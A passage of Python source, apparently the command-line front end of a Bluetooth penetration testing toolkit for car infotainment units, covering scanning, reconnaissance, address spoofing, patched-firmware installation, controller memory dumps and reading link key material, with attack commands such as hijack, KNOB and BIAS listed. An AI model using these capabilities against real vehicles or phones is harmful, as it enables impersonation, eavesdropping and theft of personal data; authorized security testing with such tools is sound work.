"""Blue-Tap CLI - Bluetooth/BLE Penetration Testing Toolkit for Automotive IVI."""

import json
import os
import re

import rich_click as click
from rich.table import Table
from rich.panel import Panel

# ── Rich-Click Configuration ─────────────────────────────────────────
click.rich_click.USE_RICH_MARKUP = True
click.rich_click.MAX_WIDTH = 120
click.rich_click.USE_CLICK_SHORT_HELP = False
click.rich_click.SHOW_ARGUMENTS = True
click.rich_click.GROUP_ARGUMENTS_OPTIONS = True
click.rich_click.STYLE_OPTION = "bold cyan"
click.rich_click.STYLE_ARGUMENT = "bold cyan"
click.rich_click.STYLE_COMMAND = "bold"

# Command grouping — pentest flow order
click.rich_click.COMMAND_GROUPS = {
    "python -m blue_tap.cli": [
        {"name": "Assessment", "commands": ["vulnscan", "fleet"]},
        {"name": "Discovery & Reconnaissance", "commands": ["scan", "recon", "adapter"]},
        {"name": "Exploitation", "commands": ["hijack", "bias", "knob", "bluffs", "encryption-downgrade", "ssp-downgrade", "spoof"]},
        {"name": "Data Extraction & Audio", "commands": ["pbap", "map", "at", "opp", "hfp", "audio", "avrcp"]},
        {"name": "Fuzzing & Stress Testing", "commands": ["fuzz", "dos"]},
        {"name": "Reporting & Automation", "commands": ["session", "report", "auto", "run"]},
    ],
}

from blue_tap import __version__
from blue_tap.utils.output import (
    banner, info, success, error, warning, verbose, device_table, service_table, channel_table,
    console, summary_panel,
)
from blue_tap.utils.interactive import resolve_address, pick_two_devices


def _normalize_command_path(ctx: click.Context) -> str:
    """Normalize Click command path into blue-tap subcommand form."""
    parts = ctx.command_path.split()
    if "blue-tap" in parts:
        return " ".join(parts[parts.index("blue-tap"):])

    # Fallback when invoked as `python -m blue_tap.cli ...`
    names = []
    node = ctx
    while node is not None:
        cmd = getattr(node, "command", None)
        name = getattr(cmd, "name", "")
        if name and name != "main":
            names.append(name)
        node = node.parent
    names.reverse()
    if not names:
        return "blue-tap"
    return f"blue-tap {' '.join(names)}"


def _extract_target_param(params: dict) -> str:
    """Best-effort target extraction for session metadata."""
    candidate_keys = (
        "address", "ivi_address", "phone_address", "target", "target_mac",
        "ivi_mac", "mac", "remote_mac",
    )
    for key in candidate_keys:
        value = params.get(key, "")
        if isinstance(value, str) and value:
            return value
    return ""


def _infer_category(command_path: str) -> str:
    """Infer a report category from click command path."""
    parts = command_path.split()
    if len(parts) < 2:
        return "general"
    root = parts[1]
    if root == "scan":
        return "scan"
    if root == "recon":
        return "recon"
    if root in {"pbap", "map", "at", "opp"}:
        return "data"
    if root in {"hfp", "audio"}:
        return "audio"
    if root == "vulnscan":
        return "vuln"
    if root == "fuzz":
        return "fuzz"
    if root == "dos":
        return "dos"
    if root in {"hijack", "auto", "bias", "avrcp", "spoof",
                "bluffs", "knob", "encryption-downgrade", "ssp-downgrade"}:
        return "attack"
    if root == "fleet":
        return "vuln"
    return "general"


class LoggedCommand(click.RichCommand):
    """Click command with automatic session logging for every invocation."""

    def invoke(self, ctx):
        # Record which adapter is being used (first --hci wins)
        hci = ctx.params.get("hci")
        if hci:
            from blue_tap.utils.session import set_adapter
            set_adapter(hci)
        # Commands log their own structured results via log_command().
        # No auto-logging here to avoid double-counting in sessions.
        return super().invoke(ctx)


class LoggedGroup(click.RichGroup):
    """Click group that propagates logged command/group classes."""

    command_class = LoggedCommand
    group_class = None


LoggedGroup.group_class = LoggedGroup


@click.group(cls=LoggedGroup)
@click.version_option(version=__version__)
@click.option("-v", "--verbose", count=True, help="Verbosity: -v verbose, -vv debug")
@click.option("-s", "--session", "session_name", default=None,
              help="Session name (default: auto-generated from date/time). "
                   "Use to resume a previous session.")
def main(verbose, session_name):
    """Blue-Tap: Bluetooth/BLE Penetration Testing Toolkit for Automotive IVI.

    \b
    Quick start:
      blue-tap adapter list                        # check adapters
      blue-tap scan classic                        # discover devices
      blue-tap vulnscan AA:BB:CC:DD:EE:FF          # vulnerability scan
      blue-tap hijack IVI_MAC PHONE_MAC            # full attack chain

    \b
    Sessions (automatic — all output is always saved):
      blue-tap scan classic                        # auto-session created
      blue-tap -s mytest scan classic              # named session
      blue-tap -s mytest vulnscan TARGET           # resume named session
      blue-tap session list                        # see all sessions
      blue-tap report                              # report from latest session
    """
    from blue_tap.utils.output import set_verbosity
    set_verbosity(verbose)

    # Determine the subcommand from Click context (works for both CLI and
    # in-process invocation via CliRunner or main.make_context).
    ctx = click.get_current_context()
    invoked = ctx.invoked_subcommand or ""

    # Skip session creation for help and read-only commands
    if not invoked:
        return
    _NO_SESSION_COMMANDS = {"session", "report", "adapter"}
    if not session_name and invoked in _NO_SESSION_COMMANDS:
        return

    # Create session for active commands
    from blue_tap.utils.session import Session, set_session
    from datetime import datetime
    if not session_name:
        session_name = datetime.now().strftime("blue-tap_%Y%m%d_%H%M%S")
    session = Session(session_name)
    set_session(session)
    info(f"Session: [bold]{session_name}[/bold] -> {session.dir}")

    # ---- Hardware detection, DarkFirmware auto-flash, hook init, watchdog ----
    try:
        _startup_hardware_check()
    except Exception:
        pass  # Don't let hardware detection break CLI startup


def _startup_hardware_check() -> None:
    """Non-blocking hardware detection and DarkFirmware initialization.

    Sequence:
      1. Detect RTL8761B dongle via lsusb / sysfs
      2. If not found → warn about unavailable features, skip DarkFirmware
      3. If found → auto-flash DarkFirmware if not loaded
      4. Init all 4 hooks (RAM writes for Hooks 3+4)
      5. Start watchdog for USB reset/replug recovery
    """
    from blue_tap.core.firmware import DarkFirmwareManager, DarkFirmwareWatchdog
    from blue_tap.utils.bt_helpers import run_cmd

    fw = DarkFirmwareManager()

    # Step 1: Detect RTL8761B hardware — prefer sysfs/hciconfig detection
    # which is per-HCI, over lsusb which is global.
    # Try hci0 first since it's the most common index for USB dongles.
    dongle_hci = None
    for hci_dev in ("hci0", "hci1", "hci2"):
        if fw.detect_rtl8761b(hci_dev):
            dongle_hci = hci_dev
            break

    if dongle_hci is None:
        # Check if any BT adapter is present at all
        bt_result = run_cmd(["hciconfig"])
        has_any_adapter = bt_result.returncode == 0 and "hci" in bt_result.stdout.lower()

        if has_any_adapter:
            info(
                "RTL8761B dongle not detected — using system Bluetooth adapter.\n"
                "  [dim]Features unavailable without RTL8761B (TP-Link UB500):[/dim]\n"
                "  [dim]  - LMP injection/monitoring (BLUFFS, KNOB via LMP, BIAS via LMP)[/dim]\n"
                "  [dim]  - Encryption downgrade attacks[/dim]\n"
                "  [dim]  - LMP fuzzing and state confusion tests[/dim]\n"
                "  [dim]  - Below-stack L2CAP injection[/dim]\n"
                "  [dim]  - Connection table inspection[/dim]\n"
                "  [dim]All HCI-level features (scan, recon, vulnscan, hijack, fuzz L2CAP/RFCOMM/BLE, DoS) work normally.[/dim]"
            )
        else:
            warning(
                "No Bluetooth adapter detected.\n"
                "  [dim]Plug in a USB Bluetooth adapter and retry.[/dim]\n"
                "  [dim]Recommended: TP-Link UB500 (RTL8761B) for full feature access.[/dim]"
            )
        return

    # Step 2: Check if DarkFirmware is loaded — prompt to install if not
    # (Don't auto-flash: user may have custom firmware or not want changes)
    if not fw.is_darkfirmware_loaded(dongle_hci):
        warning(
            f"RTL8761B detected on {dongle_hci} but DarkFirmware not loaded.\n"
            f"  Install with: [bold]sudo blue-tap adapter firmware-install --hci {dongle_hci}[/bold]\n"
            f"  [dim]Without DarkFirmware: LMP injection, BLUFFS, encryption downgrade, "
            f"and LMP fuzzing are unavailable.[/dim]"
        )
        return

    # Step 3: Initialize all 4 hooks (Hooks 3+4 need RAM writes)
    hook_status = fw.init_hooks(dongle_hci)
    if hook_status.get("all_ok"):
        info(
            f"[green]DarkFirmware active on {dongle_hci}[/green] — "
            f"all 4 hooks initialized (LMP inject/monitor, LC TX/RX logging)"
        )
    else:
        active = [k for k in ("hook1", "hook2", "hook3", "hook4") if hook_status.get(k)]
        failed = [k for k in ("hook1", "hook2", "hook3", "hook4") if not hook_status.get(k)]
        info(
            f"[green]DarkFirmware active on {dongle_hci}[/green] — "
            f"hooks: active=[{', '.join(active)}] failed=[{', '.join(failed)}]"
        )

    # Step 4: Start watchdog for USB reset/replug recovery
    watchdog = DarkFirmwareWatchdog(dongle_hci, poll_interval=30.0)
    watchdog.start()


# ============================================================================
# ADAPTER MANAGEMENT
# ============================================================================
@main.group()
def adapter():
    """HCI Bluetooth adapter management."""


@adapter.command("list")
def adapter_list():
    """List available Bluetooth adapters with chipset and capability info."""
    from blue_tap.core.adapter import list_adapters, recommend_adapter_roles

    adapters = list_adapters()
    if not adapters:
        return

    from rich.style import Style as _S
    table = Table(title="[bold #00d4ff]HCI Adapters[/bold #00d4ff]", show_lines=True, border_style="#666666", header_style=_S(bold=True, color="#00d4ff"))
    table.add_column("Name", style="#00d4ff")
    table.add_column("Address", style="#bf5af2")
    table.add_column("Chipset", style="#ffaa00")
    table.add_column("BT Ver", style="#4488ff")
    table.add_column("Features", style="dim")
    table.add_column("Spoof?", style="bold")
    table.add_column("Status", style="bold")

    for a in adapters:
        status_style = "green" if a["status"] == "UP" else "red"
        chipset = a.get("chipset", a.get("type", ""))
        bt_ver = a.get("bt_version", "")
        features = ", ".join(a.get("features", [])[:5])
        can_spoof = a.get("capabilities", {}).get("address_change")
        spoof_str = {True: "[green]Yes[/green]", False: "[red]No[/red]", None: "[yellow]?[/yellow]"}[can_spoof]
        table.add_row(a["name"], a["address"], chipset, bt_ver, features, spoof_str,
                       f"[{status_style}]{a['status']}[/{status_style}]")

    console.print(table)

    # Show adapter role recommendations if multiple adapters
    if len(adapters) >= 1:
        rec = recommend_adapter_roles(adapters)
        for note in rec.get("notes", []):
            info(note)


@adapter.command("info")
@click.argument("hci", default="hci0")
def adapter_info(hci):
    """Show detailed adapter info: chipset, features, capabilities."""
    from blue_tap.core.adapter import get_adapter_info, _adapter_exists
    if not _adapter_exists(hci):
        return
    ext = get_adapter_info(hci)

    panel_data = {
        "Chipset": ext.get("chipset", "Unknown"),
        "Manufacturer": ext.get("manufacturer", "Unknown"),
        "BT Version": ext.get("bt_version", "Unknown"),
        "Features": ", ".join(ext.get("features", [])) or "None detected",
        "BR/EDR": str(ext["capabilities"]["bredr"]),
        "LE": str(ext["capabilities"]["le"]),
        "Dual-Mode": str(ext["capabilities"]["dual_mode"]),
        "SSP": str(ext["capabilities"]["ssp"]),
        "Secure Connections": str(ext["capabilities"]["sc"]),
        "MAC Spoofing": {True: "Supported", False: "NOT supported", None: "Unknown"}[ext["capabilities"]["address_change"]],
    }
    summary_panel(f"Adapter {hci} Details", panel_data)


@adapter.command()
@click.argument("hci", default="hci0")
def up(hci):
    """Bring adapter up."""
    from blue_tap.core.adapter import adapter_up
    adapter_up(hci)


@adapter.command()
@click.argument("hci", default="hci0")
def down(hci):
    """Bring adapter down."""
    from blue_tap.core.adapter import adapter_down
    adapter_down(hci)


@adapter.command()
@click.argument("hci", default="hci0")
def reset(hci):
    """Reset adapter."""
    from blue_tap.core.adapter import adapter_reset
    adapter_reset(hci)


@adapter.command("set-name")
@click.argument("hci")
@click.argument("name")
def set_name(hci, name):
    """Set adapter Bluetooth name (for impersonation)."""
    from blue_tap.core.adapter import set_device_name
    set_device_name(hci, name)


@adapter.command("set-class")
@click.argument("hci")
@click.argument("device_class", default="0x5a020c")
def set_class(hci, device_class):
    """Set device class. Default 0x5a020c = smartphone."""
    from blue_tap.core.adapter import set_device_class
    set_device_class(hci, device_class)


@adapter.command("firmware-status")
@click.option("--hci", default="hci1", help="HCI device to check")
def adapter_firmware_status(hci):
    """Check DarkFirmware status on RTL8761B adapter."""
    from blue_tap.core.firmware import DarkFirmwareManager

    fw = DarkFirmwareManager()
    status = fw.get_firmware_status(hci)

    # Display with Rich formatting
    info(f"RTL8761B detected: {status.get('installed', False)}")
    info(f"DarkFirmware loaded: {status.get('loaded', False)}")
    info(f"Current BDADDR: {status.get('bdaddr', 'unknown')}")
    info(f"Original firmware backed up: {status.get('original_backed_up', False)}")
    if status.get("capabilities"):
        info(f"Capabilities: {', '.join(status['capabilities'])}")


@adapter.command("firmware-install")
@click.option("--source", default=None, type=click.Path(exists=True),
              help="Path to custom firmware binary (default: bundled DarkFirmware)")
@click.option("--restore", is_flag=True, help="Restore original Realtek firmware")
@click.option("--hci", default="hci1", help="HCI device")
def adapter_firmware_install(source, restore, hci):
    """Install DarkFirmware on RTL8761B adapter.

    \b
    Copies the pre-patched DarkFirmware (bundled with Blue-Tap) to
    /lib/firmware/rtl_bt/ and USB-resets the adapter.  The original
    firmware is backed up automatically.  Requires root.

    \b
    Features enabled by DarkFirmware:
      - LMP packet injection (VSC 0xFE22)
      - LMP traffic monitoring (HCI Event 0xFF)
      - Controller memory read/write (VSC 0xFC61/0xFC62)
      - Full 17-byte LMP PDU support (BLUFFS, BIAS, BrakTooth)
      - BDADDR spoofing via firmware patching

    \b
    Examples:
      sudo blue-tap adapter firmware-install           # install bundled DarkFirmware
      sudo blue-tap adapter firmware-install --restore  # revert to stock Realtek
    """
    from blue_tap.core.firmware import DarkFirmwareManager

    fw = DarkFirmwareManager()

    if restore:
        if fw.restore_firmware():
            info("Resetting adapter to load original firmware...")
            fw.usb_reset()
            import time
            time.sleep(2.5)
            success("Original Realtek firmware restored")
        else:
            error("Failed to restore firmware")
        return

    if not fw.detect_rtl8761b(hci):
        error(f"No RTL8761B adapter detected on {hci}. "
              f"This command only works with TP-Link UB500 or compatible RTL8761B dongles.")
        return

    if fw.install_firmware(source):
        info("Resetting adapter to load DarkFirmware...")
        fw.usb_reset()
        import time
        time.sleep(2.5)

        if fw.is_darkfirmware_loaded(hci):
            success("DarkFirmware installed and verified!")
        else:
            warning("Firmware installed but DarkFirmware not detected — "
                    "adapter may need manual replug")
    else:
        error("Firmware installation failed")


@adapter.command("firmware-init")
@click.option("--hci", default="hci1", help="HCI device")
def adapter_firmware_init(hci):
    """Initialize DarkFirmware hooks (activate Hooks 3+4).

    \b
    Hooks 1+2 are persistent in the firmware binary and survive USB resets.
    Hooks 3+4 need two RAM writes after each boot to activate bidirectional
    traffic logging (outgoing LMP/ACL via Hook 3, incoming LC via Hook 4).

    \b
    This runs automatically at startup.  Use this command manually if you
    plugged in the adapter after Blue-Tap started.
    """
    from blue_tap.core.firmware import DarkFirmwareManager

    fw = DarkFirmwareManager()
    if not fw.is_darkfirmware_loaded(hci):
        error(f"DarkFirmware not detected on {hci}")
        return

    result = fw.init_hooks(hci)
    if result.get("all_ok"):
        success("All 4 hooks initialized")
    else:
        for hook in ("hook1", "hook2", "hook3", "hook4"):
            status = "active" if result.get(hook) else "FAILED"
            info(f"  {hook}: {status}")


@adapter.command("connection-inspect")
@click.option("--conn", type=int, default=-1, help="Slot 0-11, or -1 for all")
@click.option("--watch", is_flag=True, help="Continuous monitoring")
@click.option("--interval", type=float, default=3.0, help="Watch interval (seconds)")
@click.option("--hci", default="hci0", help="HCI device with DarkFirmware")
def adapter_connection_inspect(conn, watch, interval, hci):
    """Inspect live connection security state from controller RAM.

    \b
    Reads the RTL8761B connection table via DarkFirmware to show:
      - Encryption key size (KNOB vulnerability if key_size=1)
      - Encryption enabled/disabled
      - Authentication state
      - Secure Connections flag
      - Link key material

    \b
    Examples:
      sudo blue-tap adapter connection-inspect              # scan all 12 slots
      sudo blue-tap adapter connection-inspect --conn 0     # specific slot
      sudo blue-tap adapter connection-inspect --watch      # continuous monitoring
    """
    from blue_tap.core.firmware import ConnectionInspector, DarkFirmwareManager
    from blue_tap.core.hci_vsc import HCIVSCSocket

    fw = DarkFirmwareManager()
    if not fw.is_darkfirmware_loaded(hci):
        error(f"DarkFirmware not detected on {hci}")
        return

    hci_idx = int(hci.replace("hci", ""))
    inspector = ConnectionInspector()

    if watch:
        info(f"Watching connections on {hci} every {interval}s (Ctrl+C to stop)...")
        try:
            with HCIVSCSocket(hci_dev=hci_idx) as sock:
                import time
                while True:
                    ts = time.strftime("%H:%M:%S")
                    slots = [conn] if conn >= 0 else range(12)
                    for s in slots:
                        r = inspector.inspect_connection(sock, s)
                        if r.get("active"):
                            _display_connection(ts, r)
                    time.sleep(interval)
        except KeyboardInterrupt:
            info("Stopped")
    else:
        try:
            with HCIVSCSocket(hci_dev=hci_idx) as sock:
                if conn >= 0:
                    r = inspector.inspect_connection(sock, conn)
                    if r.get("active"):
                        _display_connection(None, r)
                    else:
                        info(f"Slot {conn}: no active connection")
                else:
                    active = inspector.scan_all_connections(sock)
                    if active:
                        for r in active:
                            _display_connection(None, r)
                    else:
                        info("No active connections found")
        except Exception as exc:
            error(f"Connection inspect failed: {exc}")


def _display_connection(ts, r):
    """Format and display a connection inspection result."""
    prefix = f"[{ts}] " if ts else ""
    slot = r.get("conn_index", "?")
    bdaddr = r.get("bdaddr", "unknown")
    info(f"{prefix}Slot {slot}: {bdaddr}")
    info(f"  Secondary struct: {r.get('secondary_ptr', 'N/A')}")

    enc = r.get("enc_enabled")
    key_size = r.get("enc_key_size")
    sc = r.get("secure_connections")
    auth = r.get("auth_state")

    enc_str = "YES" if enc else "NO" if enc is not None else "?"
    sc_str = "YES" if sc else "NO" if sc is not None else "?"
    info(f"  Encryption: {enc_str} (key_size={key_size} bytes)")
    info(f"  Secure Connections: {sc_str}")
    info(f"  Auth state: 0x{auth:02X}" if auth is not None else "  Auth state: ?")

    # KNOB check
    if enc and key_size is not None:
        if key_size == 1:
            warning(f"  [!!!] KNOB VULNERABLE — 1-byte encryption key!")
        elif key_size < 7:
            warning(f"  [!!] WEAK ENCRYPTION — key_size={key_size} bytes")

    # Key material
    key_copy = r.get("key_material_copy", "")
    if key_copy and key_copy != "00" * 32:
        info(f"  Key material: {key_copy[:32]}...")


@adapter.command("firmware-spoof")
@click.argument("address")
@click.option("--hci", default="hci1", help="HCI device")
def adapter_firmware_spoof(address, hci):
    """Spoof BDADDR via DarkFirmware firmware patching.

    Patches the firmware binary and USB-resets the adapter.
    This is the only reliable spoofing method for Realtek chipsets.
    """
    from blue_tap.core.firmware import DarkFirmwareManager

    fw = DarkFirmwareManager()
    if not fw.detect_rtl8761b(hci):
        error(f"No RTL8761B detected on {hci}")
        return

    info(f"Patching BDADDR to {address}...")
    if fw.patch_bdaddr(address, hci):
        success(f"BDADDR set to {address}")
    else:
        error("BDADDR patching failed")


@adapter.command("firmware-set")
@click.argument("setting", type=click.Choice(["lmp-size", "lmp-slot"]))
@click.argument("value", type=int)
@click.option("--hci", default="hci1", help="HCI device")
def adapter_firmware_set(setting, value, hci):
    """Configure DarkFirmware parameters (persistent).

    Changes are written to the firmware file on disk AND applied to live
    RAM.  Survives USB resets, replugs, and reboots.

    \b
    Settings:
      lmp-size   Max LMP packet size in bytes (default 10, spec max 17)
      lmp-slot   ACL connection slot for LMP injection (0-11, default 0)

    \b
    Examples:
      blue-tap adapter firmware-set lmp-size 17     # unlock full LMP PDUs
      blue-tap adapter firmware-set lmp-size 10     # revert to default
      blue-tap adapter firmware-set lmp-slot 0      # target first connection
      blue-tap adapter firmware-set lmp-slot 2      # target third connection
    """
    from blue_tap.core.firmware import DarkFirmwareManager

    fw = DarkFirmwareManager()
    if not fw.is_darkfirmware_loaded(hci):
        error(f"DarkFirmware not loaded on {hci}")
        return

    if setting == "lmp-size":
        if fw.patch_send_length(value, hci):
            success(f"LMP send size set to {value} bytes")
        else:
            error(f"Failed to set LMP send size to {value}")
    elif setting == "lmp-slot":
        if fw.patch_connection_index(value, hci):
            success(f"LMP injection slot set to {value}")
        else:
            error(f"Failed to set LMP slot to {value}")


@adapter.command("firmware-dump")
@click.option("--start", type=str, default=None, help="Start address (hex, e.g., 0x80000000)")
@click.option("--end", type=str, default=None, help="End address (hex)")
@click.option("--region", type=click.Choice(["rom", "ram", "patch", "hooks"]), default=None,
              help="Preset memory region")
@click.option("-o", "--output", required=True, help="Output file path")
@click.option("--hci", default="hci1", help="HCI device")
def adapter_firmware_dump(start, end, region, output, hci):
    """Dump RTL8761B controller memory to file.

    \b
    Read firmware ROM/RAM via DarkFirmware memory read VSC.
    Use for offline reverse engineering, heap analysis, or
    link key extraction.

    \b
    Preset regions:
      rom    0x80000000 - 0x80100000  (1MB firmware ROM)
      ram    0x80100000 - 0x80134000  (~200KB working RAM)
      patch  0x80110000 - 0x80120000  (64KB DarkFirmware patch area)
      hooks  0x80133F00 - 0x80134000  (256B hook backup area)

    \b
    Examples:
      blue-tap adapter firmware-dump --region rom -o rom.bin
      blue-tap adapter firmware-dump --region ram -o ram.bin
      blue-tap adapter firmware-dump --start 0x8012DC50 --end 0x8012F450 -o connections.bin
    """
    from blue_tap.core.firmware import DarkFirmwareManager, MEMORY_REGIONS

    fw = DarkFirmwareManager()
    if not fw.is_darkfirmware_loaded(hci):
        error(f"DarkFirmware not loaded on {hci}")
        return

    if region:
        start_addr, end_addr = MEMORY_REGIONS[region]
        info(f"Using preset region '{region}': 0x{start_addr:08X} - 0x{end_addr:08X}")
    elif start and end:
        try:
            start_addr = int(start, 16) if isinstance(start, str) else start
            end_addr = int(end, 16) if isinstance(end, str) else end
        except ValueError:
            error("Start and end addresses must be valid hex (e.g., 0x80000000)")
            return
    else:
        error("Provide either --region or both --start and --end")
        return

    if fw.dump_memory(start_addr, end_addr, output, hci):
        success(f"Dump saved to {output}")
    else:
        error("Memory dump failed")


@adapter.command("connections")
@click.option("--dump", is_flag=True, help="Full hex dump of all 12 slots")
@click.option("--slot", type=int, default=None, help="Dump specific slot (0-11)")
@click.option("-o", "--output", default=None, help="Save raw dump to file")
@click.option("--hci", default="hci1", help="HCI device")
def adapter_connections(dump, slot, output, hci):
    """Inspect firmware connection table (12 slots).

    \b
    Reads the RTL8761B controller's internal connection array directly
    from firmware RAM. Shows which slots are active and their metadata.

    \b
    Use --dump for raw hex analysis. Compare dumps before/after connecting
    a device to reverse-engineer the struct layout.

    \b
    Examples:
      blue-tap adapter connections                     # list active slots
      blue-tap adapter connections --dump              # hex dump all 12 slots
      blue-tap adapter connections --slot 0 -o slot0.bin  # save slot 0 to file
    """
    from blue_tap.core.firmware import DarkFirmwareManager

    fw = DarkFirmwareManager()
    if not fw.is_darkfirmware_loaded(hci):
        error(f"DarkFirmware not loaded on {hci}")
        return

    # Single slot raw dump
    if slot is not None:
        if not 0 <= slot <= 11:
            error("Slot must be 0-11")
            return
        info(f"Dumping raw connection slot {slot}...")
        raw = fw.dump_connection_raw(slot, hci)
        if not raw:
            error(f"Failed to read slot {slot}")
            return
        # Display hex dump
        for i in range(0, len(raw), 16):
            hex_part = " ".join(f"{b:02X}" for b in raw[i:i+16])
            ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in raw[i:i+16])
            info(f"  {i:04X}: {hex_part:<48s}  {ascii_part}")
        if output:
            with open(output, "wb") as f:
                f.write(raw)
            success(f"Slot {slot} raw dump saved to {output} ({len(raw)} bytes)")
        return

    # Read all connection slots
    info("Reading connection table from firmware RAM...")
    connections = fw.dump_connections(hci)
    if not connections:
        warning("No connection data retrieved")
        return

    # Display table
    table = Table(title="[bold #00d4ff]Connection Slots[/bold #00d4ff]", show_lines=True)
    table.add_column("Slot", style="#00d4ff", justify="center")
    table.add_column("Status", justify="center")
    table.add_column("BD_ADDR", style="#bf5af2")
    table.add_column("Address", style="dim")
    if dump:
        table.add_column("First 32 bytes (hex)", style="dim")

    for conn in connections:
        status = "[green]ACTIVE[/green]" if conn["active"] else "[dim]inactive[/dim]"
        row = [str(conn["slot"]), status, conn["bd_addr"] or "-", conn["address"]]
        if dump:
            raw_hex = conn["raw_hex"][:64]  # first 32 bytes as hex
            formatted = " ".join(raw_hex[i:i+2] for i in range(0, len(raw_hex), 2))
            row.append(formatted)
        table.add_row(*row)

    console.print(table)

    active = sum(1 for c in connections if c["active"])
    info(f"Summary: {active} active / {len(connections)} total connection slots")

    if output:
        import json as _json
        with open(output, "w") as f:
            _json.dump(connections, f, indent=2)
        success(f"Connection data saved to {output}")


# ============================================================================
# SCANNING
# ============================================================================
@main.group()
def scan():
    """Discover Bluetooth Classic and BLE devices."""


@scan.command("classic")
@click.option("-d", "--duration", default=10, help="Scan duration in seconds")
@click.option("-i", "--hci", default="hci0", help="HCI adapter")
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def scan_classic(duration, hci, output):
    """Scan for Bluetooth Classic devices."""
    from blue_tap.core.scanner import scan_classic as _scan
    from blue_tap.utils.session import log_command

    info(f"Scanning for Classic BT devices on {hci} ({duration}s)...")
    devices = _scan(duration, hci)
    if devices:
        success(f"Scan complete: {len(devices)} device(s) discovered")
        console.print(device_table(devices, "Classic BT Devices"))
        log_command("scan_classic", devices, category="scan")
    else:
        warning("Scan complete: no devices found")
    if output:
        _save_json(devices, output)


@scan.command("ble")
@click.option("-d", "--duration", default=10, help="Scan duration in seconds")
@click.option("-p", "--passive", is_flag=True, help="Passive scan (no SCAN_REQ, stealthier)")
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def scan_ble(duration, passive, output):
    """Scan for BLE devices. Use --passive for stealth mode."""
    from blue_tap.core.scanner import scan_ble_sync
    from blue_tap.utils.session import log_command

    mode = "passive" if passive else "active"
    info(f"Scanning for BLE devices ({duration}s, {mode} mode)...")
    devices = scan_ble_sync(duration, passive=passive)
    if devices:
        success(f"BLE scan complete: {len(devices)} device(s) discovered")
        console.print(device_table(devices, "BLE Devices"))
        log_command("scan_ble", devices, category="scan")
    else:
        warning("BLE scan complete: no devices found")
    if output:
        _save_json(devices, output)


@scan.command("all")
@click.option("-d", "--duration", default=10, help="Scan duration in seconds")
@click.option("-i", "--hci", default="hci0", help="HCI adapter")
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def scan_all(duration, hci, output):
    """Scan both Classic BT and BLE simultaneously."""
    from blue_tap.core.scanner import scan_all as _scan_all
    from blue_tap.utils.session import log_command

    info(f"Scanning for Classic BT + BLE devices on {hci} ({duration}s)...")
    devices = _scan_all(duration, hci)
    if devices:
        success(f"Scan complete: {len(devices)} device(s) discovered")
        console.print(device_table(devices, "All Bluetooth Devices"))
        log_command("scan_all", devices, category="scan")
    else:
        warning("Scan complete: no devices found")
    if output:
        _save_json(devices, output)


# ============================================================================
# RECONNAISSANCE
# ============================================================================
@main.group()
def recon():
    """Service enumeration and device fingerprinting."""


@recon.command("sdp")
@click.argument("address", required=False, default=None)
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def recon_sdp(address, output):
    """Browse SDP services on a target device."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.recon.sdp import browse_services

    info(f"Browsing SDP services on [bold]{address}[/bold]...")
    services = browse_services(address)
    if services:
        success(f"Found {len(services)} SDP service(s)")
        console.print(service_table(services, f"SDP Services: {address}"))

        # Highlight interesting services
        for svc in services:
            profile = svc.get("profile", "")
            if any(kw in profile for kw in ["PBAP", "MAP", "HFP", "A2DP", "SPP"]):
                info(f"  Attack surface: {svc.get('name')} -> {profile} "
                     f"(ch={svc.get('channel')})")
    else:
        warning(f"No SDP services found on {address}")

    from blue_tap.utils.session import log_command
    log_command("sdp_browse", services, category="recon", target=address)

    if output:
        _save_json(services, output)


@recon.command("gatt")
@click.argument("address", required=False, default=None)
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def recon_gatt(address, output):
    """Enumerate BLE GATT services and characteristics."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.recon.gatt import enumerate_services_sync

    info(f"Enumerating GATT services on [bold]{address}[/bold]...")
    services = enumerate_services_sync(address)
    if not services:
        warning("No GATT services found")
        return
    total_chars = sum(len(s.get("characteristics", [])) for s in services)
    success(f"Found {len(services)} service(s) with {total_chars} characteristic(s)")
    for svc in services:
        console.print(f"\n[bold cyan]Service: {svc['description']}[/bold cyan]")
        console.print(f"  UUID: {svc['uuid']}  Handle: {svc['handle']}")
        for char in svc["characteristics"]:
            props = ", ".join(char["properties"])
            console.print(f"  [green]{char['description']}[/green] [{props}]")
            console.print(f"    UUID: {char['uuid']}")
            if char.get("value_hex"):
                console.print(f"    Value: {char['value_hex']} | {char.get('value_str', '')}")

    from blue_tap.utils.session import log_command
    log_command("gatt_enum", services, category="recon", target=address)

    if output:
        _save_json(services, output)


@recon.command("fingerprint")
@click.argument("address", required=False, default=None)
@click.option("-o", "--output", default=None, help="Output file (JSON)")
def recon_fingerprint(address, output):
    """Fingerprint a device and identify IVI characteristics."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.recon.fingerprint import fingerprint_device

    info(f"Fingerprinting device [bold]{address}[/bold]...")
    fp = fingerprint_device(address)
    success(f"Fingerprint complete: {fp.get('manufacturer', '?')}, BT {fp.get('bt_version', '?')}, "
            f"{len(fp.get('profiles', []))} profile(s)")

    class_info = fp.get("device_class_info", {})
    class_str = ""
    if class_info:
        class_str = f"{class_info.get('major', '?')}/{class_info.get('minor', '?')}"
        if class_info.get("services"):
            class_str += f" [{', '.join(class_info['services'])}]"

    ivi_str = "[green]LIKELY[/green]" if fp.get("ivi_likely") else "[dim]Unknown[/dim]"
    panel_text = f"""[cyan]Address:[/cyan] {fp['address']}
[cyan]Name:[/cyan] {fp['name']}
[cyan]Chipset:[/cyan] {fp['manufacturer']}
[cyan]IVI Likely:[/cyan] {ivi_str}
[cyan]Device Class:[/cyan] {fp.get('device_class', 'N/A')} {class_str}
[cyan]BT Version:[/cyan] {fp.get('lmp_version') or fp.get('bt_version') or 'N/A'}
[cyan]Profiles:[/cyan] {len(fp['profiles'])}"""

    console.print(Panel(panel_text, title="Device Fingerprint", border_style="cyan"))

    if fp.get("ivi_signals"):
        console.print("\n[bold cyan]IVI Signals (heuristic):[/bold cyan]")
        for sig in fp["ivi_signals"]:
            console.print(f"  [cyan]~[/cyan] {sig}")

    if fp["attack_surface"]:
        console.print("\n[bold red]Attack Surface:[/bold red]")
        for surface in fp["attack_surface"]:
            console.print(f"  [red]>[/red] {surface}")

    if fp.get("vuln_hints"):
